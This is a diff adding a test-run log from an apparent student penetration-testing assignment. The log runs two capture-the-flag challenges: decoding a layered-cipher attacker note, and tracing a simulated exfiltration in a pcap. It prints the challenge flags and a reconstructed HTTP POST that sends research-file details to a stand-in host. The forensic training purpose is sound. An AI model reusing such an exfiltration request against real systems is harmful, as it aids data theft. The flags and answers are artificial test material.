@@ -1,0 +1,150 @@
+==========================================
+ OPERATION PULSELOCK - MEMBER 3 TESTS
+ Date: Fri Oct  9 20:34:04 +0530 2026
+==========================================
+[PASS] Required file exists: PL-03/challenge/README.md
+[PASS] Required file exists: PL-03/challenge/ciphertext.txt
+[PASS] Required file exists: PL-03/reset/ciphertext.original.txt
+[PASS] Required file exists: PL-03/solver/solve.py
+[PASS] Required file exists: PL-07/challenge/README.md
+[PASS] Required file exists: PL-07/challenge/hospital_traffic.pcap
+[PASS] Required file exists: PL-07/reset/hospital_traffic.original.pcap
+[PASS] Required file exists: PL-07/solver/solve.py
+
+Running: PL-03
+[+] Ciphertext loaded
+[+] Layer 1: Base64 decoding
+[+] Layer 2: ROT13 decoding
+[+] Layer 3: Vigenere decryption
+
+============================================================
+DECODED ATTACKER MESSAGE
+============================================================
+PULSELOCK INVESTIGATION LOG
+The attacker accessed the research portal using a stolen maintenance credential.
+The next entry point is the telemetry gateway.
+Recover the flag from this note:
+PULSE{attacker_note_decoded}
+============================================================
+[+] FLAG FOUND
+[PASS] PL-03 solver returns the expected flag
+[+] PL-03 challenge reset successfully.
+[+] Original ciphertext restored.
+[PASS] PL-03 reset script executes
+[PASS] PL-03 reset restores the original ciphertext
+
+Running: PL-03 after reset
+[+] Ciphertext loaded
+[+] Layer 1: Base64 decoding
+[+] Layer 2: ROT13 decoding
+[+] Layer 3: Vigenere decryption
+
+============================================================
+DECODED ATTACKER MESSAGE
+============================================================
+PULSELOCK INVESTIGATION LOG
+The attacker accessed the research portal using a stolen maintenance credential.
+The next entry point is the telemetry gateway.
+Recover the flag from this note:
+PULSE{attacker_note_decoded}
+============================================================
+[+] FLAG FOUND
+[PASS] PL-03 after reset solver returns the expected flag
+
+Running: PL-07
+======================================================================
+PL-07 SOLVER - THE EXFILTRATION TRAIL
+======================================================================
+[+] Loading PCAP: /home/vboxuser/IE3132--Penetration-Testing-Assignment-2/PL-07/challenge/hospital_traffic.pcap
+[+] Packets loaded: 17
+
+[+] Bidirectional TCP conversations identified: 5
+
+[+] Reviewing TCP conversations...
+
+[+] Suspicious upload connection(s): 1
+
+----------------------------------------------------------------------
+SUSPICIOUS CONNECTION #1
+----------------------------------------------------------------------
+Endpoint 1 : 10.10.20.45:51515
+Endpoint 2 : 185.199.110.153:443
+Timeframe  : 2026-10-09 22:47:10 → 2026-10-09 22:47:18
+Packets    : 8
+
+[+] Reconstructed application payload:
+
+POST /upload HTTP/1.1
+Host: cdn-sync.example
+Content-Type: application/octet-stream
+Content-Length: 133
+
+SESSION=RESEARCH-4421
+HOST=LAB-PC-045
+TIME=22:47:16
+TRANSFER=research_export.enc
+STATUS=CONFIRMED
+FLAG=PULSE{exfiltration_confirmed}
+HTTP/1.1 200 OK
+
+Transfer received
+
+======================================================================
+[+] FLAG FOUND: PULSE{exfiltration_confirmed}
+======================================================================
+[PASS] PL-07 solver returns the expected flag
+[+] PL-07 challenge reset successfully.
+[+] Original PCAP restored.
+[PASS] PL-07 reset script executes
+[PASS] PL-07 reset restores the original PCAP
+
+Running: PL-07 after reset
+======================================================================
+PL-07 SOLVER - THE EXFILTRATION TRAIL
+======================================================================
+[+] Loading PCAP: /home/vboxuser/IE3132--Penetration-Testing-Assignment-2/PL-07/challenge/hospital_traffic.pcap
+[+] Packets loaded: 17
+
+[+] Bidirectional TCP conversations identified: 5
+
+[+] Reviewing TCP conversations...
+
+[+] Suspicious upload connection(s): 1
+
+----------------------------------------------------------------------
+SUSPICIOUS CONNECTION #1
+----------------------------------------------------------------------
+Endpoint 1 : 10.10.20.45:51515
+Endpoint 2 : 185.199.110.153:443
+Timeframe  : 2026-10-09 22:47:10 → 2026-10-09 22:47:18
+Packets    : 8
+
+[+] Reconstructed application payload:
+
+POST /upload HTTP/1.1
+Host: cdn-sync.example
+Content-Type: application/octet-stream
+Content-Length: 133
+
+SESSION=RESEARCH-4421
+HOST=LAB-PC-045
+TIME=22:47:16
+TRANSFER=research_export.enc
+STATUS=CONFIRMED
+FLAG=PULSE{exfiltration_confirmed}
+HTTP/1.1 200 OK
+
+Transfer received
+
+======================================================================
+[+] FLAG FOUND: PULSE{exfiltration_confirmed}
+======================================================================
+[PASS] PL-07 after reset solver returns the expected flag
+
+==========================================
+ TEST SUMMARY
+ Passed: 16
+ Failed: 0
+ Log: /home/vboxuser/IE3132--Penetration-Testing-Assignment-2/test-results/member3-test-20261009-203404.log
+==========================================
+RESULT: ALL TESTS PASSED
